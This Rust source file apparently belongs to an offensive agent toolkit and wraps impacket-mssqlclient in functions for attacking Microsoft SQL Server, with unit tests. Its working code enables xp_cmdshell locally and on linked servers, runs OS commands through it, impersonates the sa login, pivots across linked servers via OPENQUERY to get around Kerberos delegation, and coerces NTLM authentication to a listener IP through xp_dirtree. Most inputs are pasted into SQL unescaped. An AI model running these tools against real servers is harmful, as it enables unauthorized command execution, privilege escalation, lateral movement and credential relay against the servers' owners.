//! MSSQL tool executors.

use anyhow::Result;
use serde_json::Value;

use crate::args::{optional_bool, optional_str, required_str};
use crate::credentials;
use crate::executor::CommandBuilder;
use crate::ToolOutput;

/// Build common MSSQL command prefix with auth and optional -windows-auth flag.
fn mssql_base(
    domain: Option<&str>,
    username: &str,
    password: Option<&str>,
    target: &str,
    windows_auth: bool,
) -> CommandBuilder {
    let auth_str = credentials::impacket_target(domain, username, password, target);

    CommandBuilder::new("impacket-mssqlclient")
        .arg(&auth_str)
        .arg_if(windows_auth, "-windows-auth")
        .timeout_secs(120)
}

/// Pipe a SQL query via stdin to an mssqlclient CommandBuilder and execute.
async fn mssql_query(cmd: CommandBuilder, query: &str) -> Result<ToolOutput> {
    cmd.stdin(format!("{query}\nexit\n")).execute().await
}

/// Extract common MSSQL args from JSON and build a base CommandBuilder.
fn mssql_from_args(args: &Value) -> Result<CommandBuilder> {
    let target = required_str(args, "target")?;
    let username = required_str(args, "username")?;
    let password = optional_str(args, "password");
    let domain = optional_str(args, "domain");
    let windows_auth = optional_bool(args, "windows_auth")
        .unwrap_or_else(|| domain.is_some_and(|d| !d.is_empty()));

    Ok(mssql_base(domain, username, password, target, windows_auth))
}

/// Execute a SQL command via impacket-mssqlclient.
///
/// Required args: `target`, `username`, `command`
/// Optional args: `password`, `domain`, `windows_auth`
pub async fn mssql_command(args: &Value) -> Result<ToolOutput> {
    let command = required_str(args, "command")?;

    mssql_query(mssql_from_args(args)?, command).await
}

/// Enable xp_cmdshell on a MSSQL server.
///
/// Required args: `target`, `username`
/// Optional args: `password`, `domain`, `windows_auth`, `impersonate_user`
pub async fn mssql_enable_xp_cmdshell(args: &Value) -> Result<ToolOutput> {
    let impersonate_user = optional_str(args, "impersonate_user");
    let base_query = "EXEC sp_configure 'show advanced options', 1; RECONFIGURE; \
                      EXEC sp_configure 'xp_cmdshell', 1; RECONFIGURE;";

    let query = match impersonate_user {
        Some(user) => format!("EXECUTE AS LOGIN = '{user}'; {base_query}"),
        None => base_query.to_string(),
    };

    mssql_query(mssql_from_args(args)?, &query).await
}

/// Enumerate impersonation permissions on a MSSQL server.
///
/// Required args: `target`, `username`
/// Optional args: `password`, `domain`, `windows_auth`
pub async fn mssql_enum_impersonation(args: &Value) -> Result<ToolOutput> {
    let query = "SELECT * FROM sys.server_permissions WHERE type = 'IM';";

    mssql_query(mssql_from_args(args)?, query).await
}

/// Impersonate a login and execute a query on a MSSQL server.
///
/// Required args: `target`, `username`, `impersonate_user`, `query`
/// Optional args: `password`, `domain`, `windows_auth`
pub async fn mssql_impersonate(args: &Value) -> Result<ToolOutput> {
    let impersonate_user = required_str(args, "impersonate_user")?;
    let query = required_str(args, "query")?;

    let full_query = format!("EXECUTE AS LOGIN = '{impersonate_user}'; {query}");

    mssql_query(mssql_from_args(args)?, &full_query).await
}

/// Enumerate linked servers on a MSSQL server.
///
/// Required args: `target`, `username`
/// Optional args: `password`, `domain`, `windows_auth`
pub async fn mssql_enum_linked_servers(args: &Value) -> Result<ToolOutput> {
    mssql_query(mssql_from_args(args)?, "EXEC sp_linkedservers;").await
}

/// Wrap `inner_query` in a source-side `EXECUTE AS LOGIN` if requested.
///
/// Cross-forest linked-server hops fail when the connecting principal can't
/// double-hop (Kerberos delegation/SID filtering). Two source-side workarounds:
/// - `EXECUTE AS LOGIN = 'sa'; <hop>` — runs the hop under sa's mapped login
///   (requires SeImpersonatePrivilege or IMPERSONATE on the target login)
/// - `SELECT * FROM OPENQUERY(...)` — uses the linked-server's configured
///   `sp_addlinkedsrvlogin` mapping (separate path: see `mssql_openquery`)
fn wrap_execute_as(inner_query: &str, impersonate_user: Option<&str>) -> String {
    match impersonate_user {
        Some(user) => format!("EXECUTE AS LOGIN = '{user}'; {inner_query}"),
        None => inner_query.to_string(),
    }
}

/// Execute a query on a linked MSSQL server.
///
/// Required args: `target`, `username`, `linked_server`, `query`
/// Optional args: `password`, `domain`, `windows_auth`, `impersonate_user`
pub async fn mssql_exec_linked(args: &Value) -> Result<ToolOutput> {
    let linked_server = required_str(args, "linked_server")?;
    let query = required_str(args, "query")?;
    let impersonate_user = optional_str(args, "impersonate_user");

    let hop = format!("EXEC ('{query}') AT [{linked_server}];");
    let full_query = wrap_execute_as(&hop, impersonate_user);

    mssql_query(mssql_from_args(args)?, &full_query).await
}

/// Enable xp_cmdshell on a linked MSSQL server.
///
/// Required args: `target`, `username`, `linked_server`
/// Optional args: `password`, `domain`, `windows_auth`, `impersonate_user`
pub async fn mssql_linked_enable_xpcmdshell(args: &Value) -> Result<ToolOutput> {
    let linked_server = required_str(args, "linked_server")?;
    let impersonate_user = optional_str(args, "impersonate_user");

    let hop = format!(
        "EXEC ('sp_configure ''show advanced options'', 1; RECONFIGURE; \
         EXEC sp_configure ''xp_cmdshell'', 1; RECONFIGURE;') AT [{linked_server}];"
    );
    let full_query = wrap_execute_as(&hop, impersonate_user);

    mssql_query(mssql_from_args(args)?, &full_query).await
}

/// Execute a command via xp_cmdshell on a linked MSSQL server.
///
/// Required args: `target`, `username`, `linked_server`, `command`
/// Optional args: `password`, `domain`, `windows_auth`, `impersonate_user`
pub async fn mssql_linked_xpcmdshell(args: &Value) -> Result<ToolOutput> {
    let linked_server = required_str(args, "linked_server")?;
    let command = required_str(args, "command")?;
    let impersonate_user = optional_str(args, "impersonate_user");

    let hop = format!("EXEC ('xp_cmdshell ''{command}''') AT [{linked_server}];");
    let full_query = wrap_execute_as(&hop, impersonate_user);

    mssql_query(mssql_from_args(args)?, &full_query).await
}

/// Query a linked MSSQL server via OPENQUERY using the linked server's
/// configured remote login (sp_addlinkedsrvlogin) — bypasses Kerberos
/// double-hop. This is the cross-forest pivot path when the connecting
/// principal cannot delegate but the linked server has an explicit login
/// mapping (e.g. `RPC OUT = ON` plus a stored credential).
///
/// Required args: `target`, `username`, `linked_server`, `query`
/// Optional args: `password`, `domain`, `windows_auth`, `impersonate_user`
pub async fn mssql_openquery(args: &Value) -> Result<ToolOutput> {
    let linked_server = required_str(args, "linked_server")?;
    let query = required_str(args, "query")?;
    let impersonate_user = optional_str(args, "impersonate_user");

    // OPENQUERY's inner string uses single quotes; double any embedded ones.
    let escaped = query.replace('\'', "''");
    let openq = format!("SELECT * FROM OPENQUERY([{linked_server}], '{escaped}');");
    let full_query = wrap_execute_as(&openq, impersonate_user);

    mssql_query(mssql_from_args(args)?, &full_query).await
}

/// Coerce NTLM authentication from a MSSQL server via xp_dirtree.
///
/// Required args: `target`, `username`, `listener_ip`
/// Optional args: `password`, `domain`, `windows_auth`
pub async fn mssql_ntlm_coerce(args: &Value) -> Result<ToolOutput> {
    let listener_ip = required_str(args, "listener_ip")?;

    let full_query = format!("EXEC master..xp_dirtree '\\\\{listener_ip}\\share'");

    mssql_query(mssql_from_args(args)?, &full_query).await
}

#[cfg(test)]
mod tests {
    use crate::args::{optional_bool, optional_str, required_str};
    use crate::credentials;
    use serde_json::json;

    // --- mssql_from_args required fields ---

    #[test]
    fn mssql_requires_target() {
        let args = json!({"username": "sa"});
        assert!(required_str(&args, "target").is_err());
    }

    #[test]
    fn mssql_requires_username() {
        let args = json!({"target": "192.168.58.1"});
        assert!(required_str(&args, "username").is_err());
    }

    #[test]
    fn mssql_windows_auth_default_false_without_domain() {
        let args = json!({"target": "192.168.58.1", "username": "sa"});
        let domain = optional_str(&args, "domain");
        let windows_auth = optional_bool(&args, "windows_auth")
            .unwrap_or_else(|| domain.is_some_and(|d| !d.is_empty()));
        assert!(!windows_auth);
    }

    #[test]
    fn mssql_windows_auth_default_true_with_domain() {
        let args = json!({
            "target": "192.168.58.1",
            "username": "svc_sql",
            "domain": "contoso.local"
        });
        let domain = optional_str(&args, "domain");
        let windows_auth = optional_bool(&args, "windows_auth")
            .unwrap_or_else(|| domain.is_some_and(|d| !d.is_empty()));
        assert!(windows_auth);
    }

    #[test]
    fn mssql_windows_auth_explicit_true() {
        let args = json!({
            "target": "192.168.58.1",
            "username": "admin",
            "windows_auth": true
        });
        let windows_auth = optional_bool(&args, "windows_auth").unwrap_or(false);
        assert!(windows_auth);
    }

    // --- mssql_base auth string via impacket_target ---

    #[test]
    fn mssql_auth_string_with_domain_and_password() {
        let auth_str =
            credentials::impacket_target(Some("CONTOSO"), "sa", Some("P@ss"), "192.168.58.1");
        assert_eq!(auth_str, "CONTOSO/sa:P@ss@192.168.58.1");
    }

    #[test]
    fn mssql_auth_string_no_domain() {
        let auth_str = credentials::impacket_target(None, "sa", Some("P@ss"), "192.168.58.1");
        assert_eq!(auth_str, "sa:P@ss@192.168.58.1");
    }

    #[test]
    fn mssql_auth_string_no_password() {
        let auth_str = credentials::impacket_target(Some("CONTOSO"), "sa", None, "192.168.58.1");
        assert_eq!(auth_str, "CONTOSO/sa@192.168.58.1");
    }

    // --- mssql_command ---

    #[test]
    fn mssql_command_requires_command() {
        let args = json!({"target": "192.168.58.1", "username": "sa"});
        assert!(required_str(&args, "command").is_err());
    }

    // --- mssql_enable_xp_cmdshell ---

    #[test]
    fn enable_xp_cmdshell_impersonate_query_format() {
        let user = "sa";
        let base_query = "EXEC sp_configure 'show advanced options', 1; RECONFIGURE; \
                          EXEC sp_configure 'xp_cmdshell', 1; RECONFIGURE;";
        let query = format!("EXECUTE AS LOGIN = '{user}'; {base_query}");
        assert!(query.starts_with("EXECUTE AS LOGIN = 'sa';"));
        assert!(query.contains("xp_cmdshell"));
    }

    #[test]
    fn enable_xp_cmdshell_no_impersonate() {
        let args = json!({
            "target": "192.168.58.1",
            "username": "sa",
            "password": "P@ss"
        });
        let impersonate_user = optional_str(&args, "impersonate_user");
        assert!(impersonate_user.is_none());
        let base_query = "EXEC sp_configure 'show advanced options', 1; RECONFIGURE; \
                          EXEC sp_configure 'xp_cmdshell', 1; RECONFIGURE;";
        let query = match impersonate_user {
            Some(user) => format!("EXECUTE AS LOGIN = '{user}'; {base_query}"),
            None => base_query.to_string(),
        };
        assert!(!query.starts_with("EXECUTE AS LOGIN"));
    }

    // --- mssql_impersonate ---

    #[test]
    fn impersonate_query_format() {
        let impersonate_user = "sa";
        let query = "SELECT SYSTEM_USER;";
        let full_query = format!("EXECUTE AS LOGIN = '{impersonate_user}'; {query}");
        assert_eq!(full_query, "EXECUTE AS LOGIN = 'sa'; SELECT SYSTEM_USER;");
    }

    #[test]
    fn impersonate_requires_impersonate_user() {
        let args = json!({
            "target": "192.168.58.1",
            "username": "sa",
            "query": "SELECT 1"
        });
        assert!(required_str(&args, "impersonate_user").is_err());
    }

    #[test]
    fn impersonate_requires_query() {
        let args = json!({
            "target": "192.168.58.1",
            "username": "sa",
            "impersonate_user": "dbo"
        });
        assert!(required_str(&args, "query").is_err());
    }

    // --- mssql_exec_linked ---

    #[test]
    fn linked_server_query_format() {
        let linked_server = "SQL02";
        let query = "SELECT SYSTEM_USER;";
        let full_query = format!("EXEC ('{query}') AT [{linked_server}];");
        assert_eq!(full_query, "EXEC ('SELECT SYSTEM_USER;') AT [SQL02];");
    }

    #[test]
    fn linked_server_requires_linked_server() {
        let args = json!({
            "target": "192.168.58.1",
            "username": "sa",
            "query": "SELECT 1"
        });
        assert!(required_str(&args, "linked_server").is_err());
    }

    #[test]
    fn linked_server_requires_query() {
        let args = json!({
            "target": "192.168.58.1",
            "username": "sa",
            "linked_server": "SQL02"
        });
        assert!(required_str(&args, "query").is_err());
    }

    // --- mssql_linked_enable_xpcmdshell ---

    #[test]
    fn linked_enable_xpcmdshell_format() {
        let linked_server = "SQL02";
        let full_query = format!(
            "EXEC ('sp_configure ''show advanced options'', 1; RECONFIGURE; \
             EXEC sp_configure ''xp_cmdshell'', 1; RECONFIGURE;') AT [{linked_server}];"
        );
        assert!(full_query.contains("AT [SQL02]"));
        assert!(full_query.contains("xp_cmdshell"));
    }

    // --- mssql_linked_xpcmdshell ---

    #[test]
    fn linked_xpcmdshell_format() {
        let linked_server = "SQL02";
        let command = "whoami";
        let full_query = format!("EXEC ('xp_cmdshell ''{command}''') AT [{linked_server}];");
        assert_eq!(full_query, "EXEC ('xp_cmdshell ''whoami''') AT [SQL02];");
    }

    #[test]
    fn linked_xpcmdshell_requires_command() {
        let args = json!({
            "target": "192.168.58.1",
            "username": "sa",
            "linked_server": "SQL02"
        });
        assert!(required_str(&args, "command").is_err());
    }

    // --- mssql_ntlm_coerce ---

    #[test]
    fn ntlm_coerce_xp_dirtree_format() {
        let listener_ip = "192.168.58.5";
        let full_query = format!("EXEC master..xp_dirtree '\\\\{listener_ip}\\share'");
        assert_eq!(
            full_query,
            "EXEC master..xp_dirtree '\\\\192.168.58.5\\share'"
        );
    }

    #[test]
    fn ntlm_coerce_requires_listener_ip() {
        let args = json!({
            "target": "192.168.58.1",
            "username": "sa"
        });
        assert!(required_str(&args, "listener_ip").is_err());
    }

    // --- mock executor tests ---

    use crate::executor::mock;

    #[tokio::test]
    async fn mssql_command_executes() {
        mock::push(mock::success());
        let args = json!({
            "target": "192.168.58.1", "username": "sa",
            "password": "P@ss", "command": "SELECT @@version"
        });
        assert!(super::mssql_command(&args).await.is_ok());
    }

    #[tokio::test]
    async fn mssql_command_windows_auth_executes() {
        mock::push(mock::success());
        let args = json!({
            "target": "192.168.58.1", "username": "admin",
            "password": "P@ss", "domain": "CONTOSO",
            "windows_auth": true, "command": "SELECT 1"
        });
        assert!(super::mssql_command(&args).await.is_ok());
    }

    #[tokio::test]
    async fn mssql_enable_xp_cmdshell_executes() {
        mock::push(mock::success());
        let args = json!({
            "target": "192.168.58.1", "username": "sa", "password": "P@ss"
        });
        assert!(super::mssql_enable_xp_cmdshell(&args).await.is_ok());
    }

    #[tokio::test]
    async fn mssql_enable_xp_cmdshell_impersonate_executes() {
        mock::push(mock::success());
        let args = json!({
            "target": "192.168.58.1", "username": "sa", "password": "P@ss",
            "impersonate_user": "dbo"
        });
        assert!(super::mssql_enable_xp_cmdshell(&args).await.is_ok());
    }

    #[tokio::test]
    async fn mssql_enum_impersonation_executes() {
        mock::push(mock::success());
        let args = json!({
            "target": "192.168.58.1", "username": "sa", "password": "P@ss"
        });
        assert!(super::mssql_enum_impersonation(&args).await.is_ok());
    }

    #[tokio::test]
    async fn mssql_impersonate_executes() {
        mock::push(mock::success());
        let args = json!({
            "target": "192.168.58.1", "username": "sa", "password": "P@ss",
            "impersonate_user": "dbo", "query": "SELECT SYSTEM_USER"
        });
        assert!(super::mssql_impersonate(&args).await.is_ok());
    }

    #[tokio::test]
    async fn mssql_enum_linked_servers_executes() {
        mock::push(mock::success());
        let args = json!({
            "target": "192.168.58.1", "username": "sa", "password": "P@ss"
        });
        assert!(super::mssql_enum_linked_servers(&args).await.is_ok());
    }

    #[tokio::test]
    async fn mssql_exec_linked_executes() {
        mock::push(mock::success());
        let args = json!({
            "target": "192.168.58.1", "username": "sa", "password": "P@ss",
            "linked_server": "SQL02", "query": "SELECT 1"
        });
        assert!(super::mssql_exec_linked(&args).await.is_ok());
    }

    #[tokio::test]
    async fn mssql_linked_enable_xpcmdshell_executes() {
        mock::push(mock::success());
        let args = json!({
            "target": "192.168.58.1", "username": "sa", "password": "P@ss",
            "linked_server": "SQL02"
        });
        assert!(super::mssql_linked_enable_xpcmdshell(&args).await.is_ok());
    }

    #[tokio::test]
    async fn mssql_linked_xpcmdshell_executes() {
        mock::push(mock::success());
        let args = json!({
            "target": "192.168.58.1", "username": "sa", "password": "P@ss",
            "linked_server": "SQL02", "command": "whoami"
        });
        assert!(super::mssql_linked_xpcmdshell(&args).await.is_ok());
    }

    #[tokio::test]
    async fn mssql_ntlm_coerce_executes() {
        mock::push(mock::success());
        let args = json!({
            "target": "192.168.58.1", "username": "sa", "password": "P@ss",
            "listener_ip": "192.168.58.5"
        });
        assert!(super::mssql_ntlm_coerce(&args).await.is_ok());
    }
}
